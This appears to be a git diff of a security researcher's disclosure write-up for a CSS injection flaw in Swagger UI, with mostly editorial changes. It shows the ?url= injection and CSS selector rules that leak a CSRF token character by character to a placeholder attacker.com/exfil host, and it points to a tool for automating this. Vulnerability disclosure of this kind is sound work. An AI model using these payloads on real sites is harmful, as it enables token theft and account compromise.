@@ -1,12 +1,12 @@
 # CSS-injection-in-Swagger-UI
 
-We have found a CSS Injection vulnerability on Swagger UI that allows attacker to use the Relative Path Overwrite (RPO) technique to perform CSS-based input field value exfiltration.
+We have found a CSS Injection vulnerability on Swagger UI that allows attacker to use the Relative Path Overwrite (RPO) [2][3]technique to perform CSS-based input field value exfiltration. In our PoC, we were able to successfully steal the value of the CSRF token.
 
 **Researcher: Kevin (DatLP) of The Tarantula Team, VinCSS (a member of Vingroup)**
 
 ## What is Swagger UI
 
-Swagger UI allows anyone — be it your development team or your end consumers — to visualize and interact with the API’s resources without having any of the implementation logic in place. It’s automatically generated from your OpenAPI (formerly known as Swagger) Specification, with the visual documentation making it easy for back end implementation and client side consumption.
+Swagger UI allows anyone — be it your development team or your end consumers — to visualize and interact with the API’s resources without having any of the implementation logic in place. It’s automatically generated from your OpenAPI (formerly known as Swagger) Specification, with the visual documentation making it easy for back end implementation and client side consumption [1].
 
 ## Background
 
@@ -16,7 +16,7 @@ We've discovered the vulnerability when reading the following in the document of
 We’ve observed that the ?url= parameter in SwaggerUI allows an aacker to override an otherwise hard‐coded schema file
 The decision was made to put this in the public issue tracker because (a) we aren’t going to immediately fix this, and (b) the aack surface for this is significantly diminished by our effecve sanizaon efforts to deter XSS aacks in documents used as input.
 ```
-Swagger had known the issue for a long time, but Swagger thought that this vulnerability could not lead to an Cross-Site Scripting (XSS) exploit there so they ignored it. So we have decided to further research on this issue. 
+Swagger had known the issue, but Swagger thought that this vulnerability could not lead to an Cross-Site Scripting (XSS) exploit, so they ignored it. So we have decided to further research on this issue. 
 
 ### Injection step:
 
@@ -34,13 +34,13 @@ url: url, // ...
 var ui = SwaggerUIBundle(swaggerOptions)
 ```
 
-This means we can inject json via the GET parameter. In the json content we use the <style> tag and CSS @import rule to load the CSS payload.
+This means we can inject json via the GET parameter. In the json content we use the <style> tag and CSS @import rule to load the CSS payload:
     
 ![](PoC-RPO-1.png)
     
 ### Exfiltration step:
 
-With CSS payload, we can use Relative Path Overwrite (RPO) technique to perform CSS-based input field value exfiltration. The following CSS code will generate a callback query to the attacker's server (https://attacker.com/exfil/a) if the CSRF token value starts with a, similarly it will make other requests (https://attacker.com/exfil/b; (https://attacker.com/exfil/c; (https://attacker.com/exfil/d) if the CSRF token value begins with b, c or d:
+With CSS payload, we can use Relative Path Overwrite (RPO) technique to perform CSS-based input field value exfiltration [4]. The following CSS code will generate a callback query to the attacker's server (https://attacker.com/exfil/a) if the CSRF token value starts with the character a, similarly it will make other requests (https://attacker.com/exfil/b; (https://attacker.com/exfil/c; https://attacker.com/exfil/d, etc) if the CSRF token value begins with character b, character c or character d:
 
 ```css
 input[name=csrf][value^=a]{
@@ -62,7 +62,7 @@ input[name=csrf][value^=aa]{
 input[name=csrf][value^=ab]{
     background-image: url(https://attacker.com/exfil/cb);
 }
-/* ...
+ ...
 input[name=csrf][value^=a9]{
     background-image: url(https://attacker.com/exfil/c9);
 ```
@@ -71,7 +71,7 @@ With sequential @import chaining as below so we can steal full of CSRF token val
 
 ![](sequential import chaining.png)
 
-You can automate all this by using the sic tool [6]
+You can automate all this by using the [sic](https://github.com/d0nutptr/sic) tool [6]
 
     
 ## Tested versions
